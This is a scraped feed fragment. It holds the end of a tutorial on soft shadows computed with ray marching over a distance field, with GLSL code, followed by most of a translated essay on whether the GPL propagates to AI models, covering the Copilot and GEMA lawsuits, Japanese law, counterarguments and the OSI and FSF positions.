  rayProgress += sceneDist;
}

// Ray-marching took more than 64 steps!
return 0.;
&lt;/code&gt;
    &lt;p&gt;This ratio feels kind of magical to me because it doesn’t correspond to any physical value. So let’s build some intuition for it by thinking through why it might take on particular values…&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;If&lt;/p&gt;&lt;code&gt;sceneDist / rayProgress &amp;gt;= 1&lt;/code&gt;, then either&lt;code&gt;sceneDist&lt;/code&gt;is big or&lt;code&gt;rayProgress&lt;/code&gt;is small (relative to each other). In the former case we’re far from any shapes and we shouldn’t be in shadow, so a light value of&lt;code&gt;1&lt;/code&gt;makes sense. In the latter case, the pixel we’re shadowing is really close to an object casting a shadow and the shadow isn’t fuzzy yet, so a light value of&lt;code&gt;1&lt;/code&gt;makes sense.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The ratio is&lt;/p&gt;&lt;code&gt;0&lt;/code&gt;only when&lt;code&gt;sceneDist&lt;/code&gt;is&lt;code&gt;0&lt;/code&gt;. This corresponds to rays that intersect an object and whose pixels are in shadow.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;And here’s a demo of what we have so far…&lt;/p&gt;
    &lt;p&gt;Rule #3 is the most straightforward one: light gets weaker the further you get from it.&lt;/p&gt;
    &lt;p&gt;Instead of returning the minimum value of &lt;code&gt;sceneDist / rayProgress&lt;/code&gt; verbatim, we multiply it by a &lt;code&gt;distanceFactor&lt;/code&gt; which is &lt;code&gt;1&lt;/code&gt; right next to the light, &lt;code&gt;0&lt;/code&gt; far away from it, and gets quadratically smaller as you move away from it.&lt;/p&gt;
    &lt;p&gt;All together, the code for the approach so far looks like this…&lt;/p&gt;
    &lt;code&gt;vec2 rayOrigin = ...;
vec2 rayDirection = ...;
float rayProgress = 0.;
float stopAt = distance(samplePt, lightPosition);
float lightContribution = 1.;
for (int i = 0; i &amp;lt; 64; i++) {
  if (rayProgress &amp;gt; stopAt) {
    // We hit the light!
    float LIGHT_RADIUS_PX = 800.;

    // fadeRatio is 1.0 next to the light and 0. at
    // LIGHT_RADIUS_PX away.
    float fadeRatio =
      1.0 - clamp(stopAt / LIGHT_RADIUS_PX, 0., 1.);

    // We'd like the light to fade off quadratically instead of
    // linearly.
    float distanceFactor = pow(fadeRatio, 2.);
    return lightContribution * distanceFactor;
  }

  // `getDistance` samples our distance field texture.
  float sceneDist = getDistance(rayOrigin + rayProgress * rayDirection);
  if (sceneDist &amp;lt;= 0.) {
    // We hit a shape! This pixel is in shadow.
    return 0.;
  }

  lightContribution = min(
    lightContribution,
    sceneDist / rayProgress
  );

  rayProgress += sceneDist;
}

// Ray-marching took more than 64 steps!
return 0.;
&lt;/code&gt;
    &lt;p&gt;I forget where I found this soft-shadow technique, but I definitely didn’t invent it. Inigo Quilez has a great post on it where he talks about using it in 3D.&lt;/p&gt;
    &lt;p&gt;Inigo’s post also talks about a gotcha with this approach that you might have noticed in the demos above: it causes banding artifacts. This is because Rule 1 assumes that the smallest value of &lt;code&gt;sceneDist&lt;/code&gt; across all steps is a good approximation for the distance from a ray to the scene. This is not always true because we sometimes take very few ray marching steps.&lt;/p&gt;
    &lt;p&gt;So in my demo I use an improved approximation that Inigo writes about in his post. I also use another trick that is more effective but less performant: instead of advancing by &lt;code&gt;sceneDist&lt;/code&gt; on each ray marching step, I advance by something like &lt;code&gt;sceneDist * randomJitter&lt;/code&gt; where &lt;code&gt;randomJitter&lt;/code&gt; is between &lt;code&gt;0&lt;/code&gt; and &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;This improves the approximation because we’re adding more steps to our ray march. But we could do that by advancing by &lt;code&gt;sceneDist * .3&lt;/code&gt;. The random jitter ensures that pixels next to each other don’t end up in the same band. This makes the result a little grainy which isn’t great. But I think looks better than banding… This is an aspect of the demo that I’m still not satisfied with, so if you have ideas for how to improve it please tell me!&lt;/p&gt;
    &lt;p&gt;Overall my demo has a few extra tweaks that I might write about in future but this is the core of it. Thanks for reading! If you have questions or comments, let me know on Twitter.&lt;/p&gt;
    &lt;p&gt;_Thank you to Jessica Liu, Susan Wang, Matt Nichols and Kenrick Rilee for giving feedback on early drafts of this post!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.rykap.com/2020/09/23/distance-fields/"/><published>2025-11-27T07:31:24+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46068777</id><title>The current state of the theory that GPL propagates to AI models</title><updated>2025-11-27T22:10:01.732567+00:00</updated><content>&lt;doc fingerprint="2d531d13953a0592"&gt;
  &lt;main&gt;
    &lt;p&gt;When GitHub Copilot was launched in 2021, the fact that its training data included a vast amount of Open Source code publicly available on GitHub attracted significant attention, sparking lively debates regarding licensing. While there were issues concerning conditions such as attribution required by most licenses, there was a particularly high volume of discourse suggesting that the conditions of copyleft licenses, such as the GNU General Public License (GNU GPL), would propagate to the model itself, necessitating that the entire model be released under the same license. The propagation of the GPL is a concept that many modern software engineers have naturally accepted; thus, for an engineer with a straightforward sensibility, it is a perfectly natural progression to think that if GPL code is included in some form, copyleft applies and the license propagates.&lt;/p&gt;
    &lt;p&gt;However, as of 2025, the theory that the license of the source code propagates to AI models trained on Open Source code is not seen as frequently as it was back then. Although some ardent believers in software freedom still advocate for such theories, it appears they are being overwhelmed by the benefits of AI coding, which has overwhelmingly permeated the programming field. Amidst this trend, even I sometimes succumb to the illusion that such a theory never existed in the first place.&lt;/p&gt;
    &lt;p&gt;Has the theory that the license of training code propagates to such AI models been completely refuted?&lt;/p&gt;
    &lt;p&gt;Actually, it has not. This issue remains an indeterminate problem where lawsuits are still ongoing and the judgments of major national governments have not been made clear. In this article, I will explain the current situation of this license propagation theory, namely “GPL propagates to AI models trained on GPL code,” and connect it to points of discussion such as the legal positioning of models and the nature of the freedom we pursue in the AI domain.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The Current Standing in Two Lawsuits&lt;/item&gt;
      &lt;item&gt;Arguments Negating the Theory of License Propagation to Models&lt;/item&gt;
      &lt;item&gt;The Stance of OSI and FSF&lt;/item&gt;
      &lt;item&gt;Summary&lt;/item&gt;
      &lt;item&gt;References&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Note: This article is an English translation of a post originally written in Japanese. While it assumes a Japanese reader, I believe it may also be useful for an English-speaking audience.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Current Standing in Two Lawsuits&lt;/head&gt;
    &lt;p&gt;First, let us organize what the “GPL propagation theory to AI models” entails. This is the idea that when an AI model ingests GPL code as training data, the model itself constitutes a derivative work (derivative) of the GPL code; therefore, when distributing the model, the copyleft conditions of the GPL, such as the obligation to disclose source code, apply. In other words, it is not a question of whether the output of the model is similar to the GPL code, but a theory that “since the model itself is a derivative containing GPL code, the GPL extends to the model.” While there were many voices supporting this theory around 2021, as mentioned earlier, it is no longer the mainstream of the discussion today. However, two major ongoing lawsuits can be cited as grounds that this theory has not been completely denied. These are Doe v. GitHub (the Copilot class action) filed in the United States and GEMA v. OpenAI filed in Germany. I will explain the history and current status of each lawsuit below.&lt;/p&gt;
    &lt;head rend="h3"&gt;Doe v. GitHub (Copilot Class Action): The Persisting Claim of Open Source License Violation&lt;/head&gt;
    &lt;p&gt;In the Copilot class action filed at the end of 2022 in relation to GitHub Copilot, anonymous developers became plaintiffs and argued that GitHub, Microsoft, and OpenAI trained their models on source code from public repositories without permission, inviting massive license violations through Copilot. Specifically, they viewed it as problematic that when Copilot reproduces part of the code that served as the training source in its output, it does not perform the author attribution or copyright notice required by licenses such as MIT or Apache-2.0 at all, and furthermore, it indiscriminately trains on and outputs code under licenses that impose copyleft conditions like the GPL, thereby trampling on license clauses. The plaintiffs claimed this was a contractual violation of open source licenses and also sought damages and injunctions, asserting that it constituted a violation of the Digital Millennium Copyright Act (DMCA) under copyright law.&lt;/p&gt;
    &lt;p&gt;In this case, several decisions have already been handed down by the United States District Court for the Northern District of California, and many of the plaintiffs’ claims have been dismissed. What were dismissed were mainly peripheral claims such as DMCA clause violations, privacy policy violations, unjust enrichment, and torts, but some DMCA violations and the claim of “violation of open source licenses” (breach of contract) are still alive. Regarding the latter specifically, the argument is that despite the plaintiffs’ code being published under licenses like GPL or MIT, the defendants failed to comply with the author attribution or the obligation to publish derivatives under the same license, which constitutes a contractual violation. Although the court did not recognize claims for monetary damages because the plaintiffs could not demonstrate a specific amount of damage, it determined that there were sufficient grounds for the claim for injunctive relief against the license violation itself. As a result, the plaintiffs are permitted to continue the lawsuit seeking an order prohibiting the act of Copilot reproducing others’ code without appropriate license indications.&lt;/p&gt;
    &lt;p&gt;As is clear from the above history, “violation of open source licenses in training data” is still being contested in court in the Copilot litigation, and this is one of the reasons why the theory of license propagation to models has not been completely denied. The plaintiffs’ claim in this lawsuit does not directly demand the release of the model itself under the GPL, but it legally pursues the point that license conditions were ignored in the process of training and output; consequently, it suggests that “if the handling does not follow the license of the training data, the act of providing the model could be illegal.” Furthermore, the court has not clearly rejected this logic at this stage and has indicated a judgment that the use of open source code is accompanied by license obligations, and providing tools that ignore this could constitute a tort subject to injunction.&lt;/p&gt;
    &lt;p&gt;However, it is necessary to note that the claims in the Copilot litigation are legally framed as breach of contract (license) or DMCA violation, and are not a direct copyright argument that “the model is a derivative work of GPL code.” No judgment has been shown stepping so far as to mandate the disclosure of the entire model under the GPL license. The actual judgment is conservative, stating “monetary damages have not been shown, but there is room for future injunctive relief,” and does not mention the obligation to disclose the model itself. In other words, at present, there is no judicial precedent directly addressing the “GPL propagation theory to models,” and the situation is one where the issue raised regarding license violation of the source code remains alive in the judicial arena.&lt;/p&gt;
    &lt;head rend="h3"&gt;GEMA v. OpenAI: The Theory Treating “Memory” in Models as Legal Reproduction&lt;/head&gt;
    &lt;p&gt;Another important lawsuit is the case where the German music copyright collective GEMA sued OpenAI. This is a copyright lawsuit concerning the unauthorized training and output of lyrics by an AI model, not AI code generation, but it carries significant theoretical implications related to “license propagation to models” even if not directly related to GPL.&lt;/p&gt;
    &lt;p&gt;In November 2025, the Munich I Regional Court handed down a judgment on this lawsuit, indicating regarding the matter where the ChatGPT model had memorized and reproduced the lyrics of 9 famous German songs, that the act of “memory” inside the model itself falls under the act of reproduction under copyright law. According to the judgment, the lyrics under the plaintiff’s management were “fixed” in the models of ChatGPT’s GPT-4 and 4o, and the situation was such that the lyrics were output almost verbatim just by the user giving a simple prompt. Based on this, the court determined that the model contains “parameters that memorized the work” internally, and if it is possible to reproduce an expression substantially identical to the original work for a human by means of an appropriate prompt, that memory itself falls under “reproduction” in Article 16 of the German Copyright Act. Furthermore, it determined that the act of actually outputting lyrics in response to a prompt is also a separate act of reproduction, and providing lyrics to the user falls under the act of making available to the public (public transmission). Also, it ruled that since all of these are done without the permission of the rights holder, they deviate from the scope justified by the TDM (Text and Data Mining) exception in the EU DSM Copyright Directive.&lt;/p&gt;
    &lt;p&gt;The important point of this judgment is that it clearly acknowledged that “if a work is recorded inside the model in a reproducible form, that state itself can constitute copyright infringement.” The court cited the text of the EU InfoSoc Directive that “reproduction includes copies in any form or manner, and does not need to be directly perceptible to humans,” and stated that in the spirit of this, even if the lyrics are encoded within the model’s parameters, it amounts to the creation of a reproduction. It went as far as to mention that “encoding in the form of probabilistic weights does not prevent it from being considered a copy,” showing a strong recognition that differences in technical formats cannot avoid the nature of reproduction under copyright law. Also, since the fact that the model could output the lyrics was not coincidental but highly consistent, it was factually found that “the direct incorporation of the essential part of the training data” occurred rather than the result of statistical learning. As a result, the Munich District Court recognized OpenAI’s liability for injunction and damages regarding the output act of the lyrics in question, and further ordered the provision of information regarding training data and output content for the future. However, this judgment is the first instance, and since OpenAI has indicated an intention to appeal, it is expected to be a continuing dispute.&lt;/p&gt;
    &lt;p&gt;The noteworthy theory shown by this GEMA judgment is the extension of the concept of reproduction under copyright law to the interior of the model. That is, if the work used as training data remains within the model and can be reproduced with a simple operation, it means the model already contains a reproduction of that work. This theory is groundbreaking in that it deems “the model contains the source work,” and indeed, in a commentary by Osborne Clarke, it is evaluated that “in contrast to the judgment of the English High Court in the Getty v. Stability AI case, the Munich District Court explicitly recognized the possibility that the AI model contains copies of the training material.” Standing on this view, the model is not merely a result of analysis, but depending on the case, can be evaluated as an aggregate of the training data itself.&lt;/p&gt;
    &lt;p&gt;However, it is necessary to keep in mind that this judgment is based on an extreme case where a complete match output was obtained with short text such as lyrics. The court itself stated, “Normally, temporary reproduction for learning remains within the purpose of analysis and does not infringe on the rights holder’s market, but in this case, the model holds the work in a restorable form and exceeds the scope of analysis,” emphasizing that the judgment is limited to “cases where the model performs complete reproduction.” Also, as the UK case shows, judicial decisions vary by country, and a legal consensus on this issue has not yet been formed.&lt;/p&gt;
    &lt;p&gt;Nevertheless, the judgment this time, which declared that the recording of a work inside a model is a reproduction, can become a major basis supporting the license propagation theory. This is because, while the premise for discussing GPL propagation is “whether the model can be said to be a reproduction or derivative work of the GPL code,” the logic of the Munich District Court legally certified exactly that “a model can be a reproduction of training data”.&lt;/p&gt;
    &lt;head rend="h3"&gt;Possibilities Derived from the Current Status of the Two Lawsuits&lt;/head&gt;
    &lt;p&gt;From the two lawsuits above, we can consider the path through which the theory of license propagation to AI models might be recognized in the future.&lt;/p&gt;
    &lt;p&gt;Let us assume the worst-case scenario from the perspective of AI operators, where these lawsuits are finalized with the plaintiffs winning. In the Copilot litigation, the judgment that “model providers must comply with the license conditions of the training source code” would be established, and in the GEMA litigation, the legal principle that “the model encompasses reproductions of the work” would be established. When these two intersect, the conclusion that “since an AI model containing GPL code is a reproduction or derivative work of the GPL code, the conditions of the GPL directly apply to its provision” is theoretically derived. That is, the possibility emerges that the theory of GPL propagation to models is effectively ratified by the judiciary.&lt;/p&gt;
    &lt;p&gt;Specifically, if the model memorizes and contains GPL code fragments internally, the act of distributing or providing that model to a third party may be regarded as the distribution of a reproduction of GPL code; in that case, the act of distribution under conditions other than GPL would be evaluated as a GPL license violation. If a GPL violation is established, there would be room to argue for remedies such as injunctions and claims for damages, as well as forced GPL compliance demanding the disclosure of the entire model under the same license, just as in the case of ordinary software. In fact, the remedies GEMA sought from OpenAI included disclosure regarding training data and output content, and although this is in the context of musical works, this can be said to be a type of disclosure request to make transparent “what the model learned and contains.” In the case of a GPL violation as well, the possibility cannot be denied that demands such as “disclosure of the GPL code parts contained inside the model” or “source disclosure in a form that allows reconstruction of the model” would emerge in seeking license compliance.&lt;/p&gt;
    &lt;p&gt;Even if not reaching such an extreme conclusion, an intermediate scenario could involve imposing certain restrictions on model providers. For example, the Copilot litigation might be settled or judged by taking measures such as “attaching a license and author attribution at the time of output if existing code of a certain length or more is included in the generated code,” or technically mandating the implementation of filters so that GPL code fragments are not extracted or reproduced from the model. In fact, GitHub, the developer of Copilot, has already introduced an optional feature that “excludes from suggestions if the candidate code matches existing code on large-scale repositories,” attempting to reduce litigation risk. Also regarding OpenAI, there are reports that it strengthened filters so that ChatGPT does not output copyrighted lyrics as they are, in response to the GEMA judgment.&lt;/p&gt;
    &lt;p&gt;While these are not license propagation itself legally, in practice, they indicate that the industry is steering in the direction of “ensuring the model does not potentially infringe license conditions.” In the future, there is a possibility that guidelines for excluding data with specific license terms like GPL at the model training stage, or mechanisms and systems to guarantee that there is no license-infringing output by conducting output inspections after training, will be established.&lt;/p&gt;
    &lt;p&gt;In any case, until these two lawsuits are completely settled and the subsequent legislative response is determined, the “theory of GPL propagation to models” has not completely disappeared. It is a scenario that could suddenly become realistic depending on future judgments, and even if the plaintiffs lose in the lawsuits, there is a possibility that support for this theory will reignite within the open source community. It is necessary to note that while it is currently an “undetermined theory not shouted as loudly as before,” that does not mean it has been legally completely denied and resolved. As our community, we need to carefully consider countermeasures while observing these trends and taking into account the legal systems of each country and opposing arguments described in the latter half of this article.&lt;/p&gt;
    &lt;head rend="h3"&gt;Treatment under Japanese Law&lt;/head&gt;
    &lt;p&gt;Based on the trends of the overseas lawsuits mentioned above, I will also organize the relationship between AI models, copyrighted works, and licenses under Japanese law. In Japan, Article 30-4 of the Copyright Act, introduced by the 2018 amendment, exists as a provision that comprehensively legalizes reproduction acts associated with machine learning. Furthermore, in March 2024, the Copyright Division of the Council for Cultural Affairs of the Agency for Cultural Affairs published a guideline-like document titled “Thought on AI and Copyright” (hereinafter “the Thought”), presenting a legal organization divided into the development/training stage and the generation/utilization stage of generative AI.&lt;/p&gt;
    &lt;p&gt;According to “the Thought,” reproduction performed basically for the purpose of AI training is legal as long as it satisfies “information analysis not for the purpose of enjoying the thoughts or sentiments expressed in the work” as defined in Article 30-4. Therefore, acts of collecting and reproducing a wide range of data from the internet to create a training dataset for research and development purposes can be done without the permission of the rights holders in principle. However, what is important is whether an “purpose of enjoyment” is mixed into that training act. “The Thought” states that if training is conducted with the purpose of “intentionally reproducing all or part of the creative expression of a specific work in the training data as the output of generative AI,” it is evaluated as having a concurrent purpose of enjoying the work rather than mere information analysis, and thus lacks the application of Article 30-4. As a typical example of this, “overfitting” is cited, and acts such as making a model memorize specific groups of works through additional training to cause it to output something similar to those works are judged to have a purpose of enjoyment.&lt;/p&gt;
    &lt;p&gt;Furthermore, “the Thought” also mentions the legal treatment of trained models, stating first that “trained models created by AI training cannot be said to be reproductions of the works used for training in many cases.” This is the view that since the model can generate outputs unrelated to the original in response to various inputs in a general-purpose manner, the model itself is not a copy of any specific work.&lt;/p&gt;
    &lt;p&gt;However, “the Thought” simultaneously acknowledges the possibility that, exceptionally, in cases where “the trained model is in a state of generating products with similarity to the work that was training data with high frequency,” the creative expression of the original work remains in the model, and it may be evaluated as a reproduction. It also points out that in such cases, the model is positioned as a machine for copyright infringement, and a claim for injunction may be recognized. In short, usually the model is merely statistical data and not the work itself, but if it has turned into a device for spewing out specific works almost as they are, it can be treated as an infringing item; this thinking shares parts with the content of the GEMA judgment.&lt;/p&gt;
    &lt;p&gt;It is necessary to note that the above organization is strictly a discussion of the scope of application of rights limitation provisions (exception provisions) under the Copyright Act, and does not touch upon the validity of contracts or license clauses. The Agency for Cultural Affairs document discusses from the perspective of “whether it is copyright infringement or not,” and does not deny that even if the training act is legal, contractual liability may arise if it violates terms of service or open source licenses separately. Also, no in-depth view has been shown regarding the propagation of copyleft clauses like the GPL. In Japan’s Copyright Act, there is no override provision where rights limitation provisions like Article 30-4 take precedence over contract conditions, and the “Contract Guidelines on Utilization of AI and Data” by the Ministry of Economy, Trade and Industry suggests the possibility that if there is a contract prohibiting data use between parties, that contract takes precedence.&lt;/p&gt;
    &lt;p&gt;Therefore, if the license is regarded as a valid contract, even if “training is legal” under Article 30-4 of the Copyright Act, the risk remains that it becomes a “violation of license conditions” under contract law, and it can be said that at least there is no official view organizing the theory of GPL propagation to models. In other words, currently, while the legality of model training acts is recognized quite broadly under the Copyright Act, license violation is left to general civil theory, and there is no clear guideline on, for example, “whether the act of publicly distributing a model trained on GPL code constitutes a GPL license violation.” Overall, the legal organization in Japan is in a situation of “safe in principle at the copyright layer, but blank at the contract layer.” Hence, the discussion in Japan regarding the theory of GPL propagation to models relies on future judicial judgments and legislative trends, and at present, there is no choice but to consider operational guidelines carefully following the organization by the Agency for Cultural Affairs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Arguments Negating the Theory of License Propagation to Models&lt;/head&gt;
    &lt;p&gt;As seen in the previous sections, the theory of GPL propagation to models is not legally zero. However, many legal experts and engineers point out that this theory has serious detrimental effects. Here, I present representative arguments negating the theory of license propagation to models from the layers of copyright law, GPL text, technology, and practical policy.&lt;/p&gt;
    &lt;head rend="h3"&gt;Arguments for Negation at the Copyright Law Layer&lt;/head&gt;
    &lt;p&gt;First, under copyright law, it is unreasonable to regard an AI model as a “derivative work” or “reproduction” of the training source works. In many cases, the expressions of specific works are not stored inside the model in a form recognizable to humans. The model merely holds statistical abstractions where text and code have been converted into weight parameters, and that itself is not a creative expression to humans at all. A “derivative work” under copyright law refers to a creation that incorporates the essential features of the expression of the original work in a form that can be directly perceived, but one cannot directly perceive the creativity of the original code from the model’s weights. In other words, the model does not show the nature of a work directly enough to be evaluated as encompassing the original code. For example, the High Court of Justice in the UK stated in the judgment of the Getty v. Stability AI case that “the Stable Diffusion model itself is not an infringing copy of the training images,” showing a negative view on regarding the model itself as a reproduction of works. Thus, there are many cautious positions internationally regarding regarding the model itself as an accumulation of works or a compilation work.&lt;/p&gt;
    &lt;p&gt;Also, the output generated by the model involves probabilistic and statistical transformations, and in many cases, things that do not resemble the training source at all are output. Even if a match or similarity occurs by chance, it is difficult to prove whether it is a reproduction relying on the original or an accidental similarity. It is not realistic to conduct the certification of reliance and similarity required to discuss copyright infringement for the entire model. Ultimately, in the framework of copyright law, there is no choice but to judge “whether the model relies on a specific work” on a work-by-work basis, and recognizing uniform copyrightability or infringing nature for the model itself is a large leap. As organized in Japanese law where the model is not considered a reproduction in most cases, the schematic of model equals work is considered unreasonable under copyright law.&lt;/p&gt;
    &lt;head rend="h3"&gt;Arguments for Negation at the GPL Text Layer&lt;/head&gt;
    &lt;p&gt;Next, looking at the license text and intent of the GPL itself, doubts are cast on the interpretation that GPL propagates to AI models. For example, in the text of GPLv2, the target of copyleft is limited to “derivative works” of the original code provided under GPL and “works that contain the Program.” Typically, this has been interpreted as software created by modifying or incorporating GPL code, or software combined (linked) with GPL code. In the case of an AI model, it is extremely unclear which part of the original GPL code the model “contains.” Even if the model could memorize fragments of the GPL code used for training, it is a tiny fraction when viewed from the entire model, and most parts are occupied by parameters unrelated to the GPL code. There is no clear assumption shown by the GPL drafters as to whether a statistical model that may partially encapsulate information derived from GPL code can be said to be “a work containing the Program”.&lt;/p&gt;
    &lt;p&gt;Furthermore, GPLv3 requires the provision of software source code in a “preferred form for modification.” If an AI model is a GPL derivative, the problem arises as to what that preferred form for modification would be. The model weights themselves have low readability and editability for humans, and are hard to call a “preferred form for modification.” If we ask whether the training data is the source code, the original trained GPL code itself cannot be said to be the source of the model, nor is it clear if it refers to the entire vast and heterogeneous training dataset. It is difficult to define what should be disclosed to redistribute the model under GPL compliance, and it could lead to an extreme conclusion that all code and data used for model training must be disclosed. While this is what some freedom believers aim for, it can only be said to be unrealistic in reality, and it deviates from the point of the GPL’s intent to enable users to modify and build from source. Thus, existing GPL provisions are not designed to directly cover products like AI models, and forcing their application causes discrepancies in both text and operation.&lt;/p&gt;
    &lt;p&gt;In fact, in the “Open Source AI Definition” compiled by the OSI (Open Source Initiative) in 2023, regarding “information necessary for modification” of the model, it stopped at stating that sufficiently detailed information about the training data should be disclosed, and did not require the provision of the training data itself in its entirety. Also, it states that model weights and training code should be published under OSI-approved licenses.&lt;/p&gt;
    &lt;p&gt;In addition, the FSF (Free Software Foundation) itself does not believe that the current GPL interpretation alone can guarantee freedom in the AI domain, and announced in 2024 that it has started formulating “conditions for machine learning applications to be free.” There, the directionality is shown that “the four freedoms should be guaranteed to users including not only software but also raw training data and model parameters,” but this conversely is a recognition that this is not guaranteed under current licenses. The FSF also points out that “since model parameters cannot be said to be source comprehensible to humans, modification through retraining is more realistic than direct editing,” and can be said to be cautious about treating models on the extension of existing GPL. Overall, claiming GPL propagation univocally to AI models that fall outside the wording and assumptions of GPL provisions is unreasonable from the perspective of interpretation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Arguments for Negation at the Technical Layer&lt;/head&gt;
    &lt;p&gt;There are also strong counterarguments from a technical perspective against the theory of GPL propagation to models. AI models, particularly those called large language models, basically hold huge statistical trends internally and do not store the original code or text as they are like a database. Returning a specific output for a specific input is merely generation according to a probability distribution, and it is not guaranteed that the same output as the training data is always obtained. If the model does not perform verbatim reproduction of training data except for a very small number of exceptional cases, evaluating it as “containing GPL code” within the model does not fit the technical reality. In fact, the OpenAI side argued in the GEMA lawsuit that “the model does not memorize individual training data, but merely reflects knowledge learned from the entire dataset in parameters.” This argument was not accepted by the Munich District Court, but that was because there was a clear example of lyric reproduction; conversely, unless there is a clear example of reproduction, the view would be that “the model is a lump of statistical knowledge”.&lt;/p&gt;
    &lt;p&gt;Furthermore, although it has been confirmed that models can output fragments of training data, that proportion is considered extremely limited when viewed from the whole. Regarding the whole as a reproduction based on the existence of partial memory is like claiming the whole is a reproduction of a photograph just because it contains a tiny mosaic-like fragment in an image, which is an excessive generalization. Technically, it is difficult to quantitatively measure how far specific parameters of the model retain the influence of the original data, and the correspondence between the model and training data remains statistical and difficult to draw a line. Therefore, criteria such as “how similar must it be for GPL to propagate?” cannot be established in the first place. The judgment of infringement or not has to be done on an individual output basis, and this would not be consistent with the idea of applying a single license to the entire model. From the technical aspect, since the model is basically a statistical transformation and the majority is unrelated to GPL code, applying GPL collectively can be said to be irrational.&lt;/p&gt;
    &lt;head rend="h3"&gt;Practical and Policy Arguments for Negation&lt;/head&gt;
    &lt;p&gt;Finally, major demerits can be pointed out regarding the theory of license propagation to models from practical and policy perspectives. What would happen if this GPL propagation theory were legally recognized? As an extreme example, if 1 million code repositories were used for training a certain large-scale model, all the various licenses contained in them (GPL, MIT, Apache, proprietary, etc.) would “propagate” to the model, and the model provider would have to distribute the model in a form that complies with all 1 million license clauses. As a practical matter, there would be combinations where conditions contradict, such as GPLv2 and Apache-2.0, and attaching and managing a huge collection of copyright notices for one model is nothing but unrealistic. Applying all licenses to an AI model created from training data with mixed licenses is practically bankrupt, and eventually, the only thing that can be done to avoid it would be to exclude code with copyleft licenses like GPL from the training data from the start.&lt;/p&gt;
    &lt;p&gt;Is such a situation really desirable for our community? The spirit of the GPL is to promote the free sharing and development of software. However, if asserting excessive propagation to AI models causes companies to avoid using GPL code, and as a result, the value held by GPL software is not utilized in the AI era, it would be putting the cart before the horse. In the field of software development, many companies take a policy of not mixing GPL code into their own products, but similarly, if it becomes “do not include GPL in our AI training data,” GPL projects could lose value as data sources. Furthermore, the current legal battles surrounding AI are leaning more towards monetary compensation and regulatory rule-making, and the reality is that they are proceeding in a different vector from the direction of code sharing idealized by GPL. If only the theory of GPL propagation to models walks alone, in reality, only data exclusion and closing off to avoid litigation risks will progress, and there is a fear that it will not lead to the expansion of free software culture.&lt;/p&gt;
    &lt;p&gt;Policy-wise as well, governments of each country are carefully considering the use of copyrighted works in AI, but at present, there is no example establishing an explicit rule that “license violation of training data generates legal liability for the model.” Even in the EU AI Act, while there are provisions regarding the quality and transparency of training data, it does not demand compliance with open source licenses. Rather, from the perspective of promoting open science and innovation, the movement to allow text and data mining under rights limitations is strong. In Japan as well, as mentioned earlier, the direction is to broadly recognize information analysis use under Article 30-4, and the policy of forcibly applying licenses to AI models is not mainstream in current international discussions.&lt;/p&gt;
    &lt;p&gt;Based on the above, the theory of license propagation to models is highly likely to cause disadvantages to open source on both practical and policy fronts, and can be said not to be a realistic solution. What is important is how to realize the “freedom of software,” which is the philosophy of open source, in the AI era; the opinion that this should be attempted through realistic means such as ensuring transparency and promoting open model development rather than extreme legal interpretations is potent, and this is something I have consistently argued as well.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Stance of OSI and FSF&lt;/head&gt;
    &lt;p&gt;I will also organize what stance major organizations in the open source (and free software) community are currently taking in relation to the theory of GPL propagation to AI models. Representative organizations are the Open Source Initiative (OSI) and the Free Software Foundation (FSF); while they share the goal of software freedom, they do not necessarily take the same approach regarding AI models and training data.&lt;/p&gt;
    &lt;p&gt;First, the OSI formulated the “Open Source AI Definition” (OSAID) in 2024, defining the requirements for an AI system to be called open source. This definition states that the four freedoms (use, study, modify, redistribute) similar to software should be guaranteed for AI systems as well, and defines requirements regarding “forms necessary for modification” to realize that, requiring the disclosure of the following three elements.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Data Information: Provide sufficiently detailed information about the data used for training so that a skilled person can reconstruct an equivalent model. &lt;list rend="ul"&gt;&lt;item&gt;This does not make publishing the training data itself in its entirety mandatory, but requires disclosing the origin, scope, nature, and acquisition method if there is data that cannot be published, listing data that can be published, and providing information on data available from third parties.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Code: Publish the complete set of source code for training and running the model under an OSI-approved license.&lt;/item&gt;
      &lt;item&gt;Parameters: Publish the model weights (parameters) under OSI-approved conditions.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It should be noted that while OSI states that information regarding the code used for training and training data is indispensable in addition to model weights to realize “Open Source AI,” it does not require the complete disclosure of the training data itself. This is a flexible stance that, for example, if raw data cannot be published due to privacy or confidentiality, explaining the nature of the data by clarifying that fact can substitute. Also, the legal mechanism to ensure free use of model parameters is an issue to be clarified in the future, and at present, no conclusion has been reached on legal rights control (e.g., presence or absence of copyrightability) over parameters either.&lt;/p&gt;
    &lt;p&gt;As can be read from these, the OSI promotes opening up AI models at the level of the open source definition in principle, but keeps the handling of training data to requirements at the information disclosure level. Thereby, it can be said that the OSI avoids adopting the theory of license propagation to models to demand training data disclosure, and is exploring a realistic solution that first guarantees transparency and reproducibility. In principle, it could be said that the OSI denied the GPL propagation theory at the time of publishing the OSAID definition. Note that I am probably the one who sealed the mandatory argument for training data in the final stage of this definition’s formulation process, and I believe this was the correct judgment.&lt;/p&gt;
    &lt;p&gt;On the other hand, the FSF and FSF Europe (FSFE) take a stance more faithful to fundamental principles. FSFE declared as of 2021 that “for an AI application to be free, both its training code and training data must be published under a free software license.” That is, to modify or verify the model, one must be able to obtain it including the training data, and therefore both must be free. Also, the FSF itself stated in a 2024 statement, “Under current understanding, for an ML application to be called free, all training data and the scripts processing it must satisfy the four freedoms,” trying to extend the requirements of freedom to data. Thus, FSF/FSFE stands on the position that a model with undisclosed training data is unfree as a whole even if the software part is free.&lt;/p&gt;
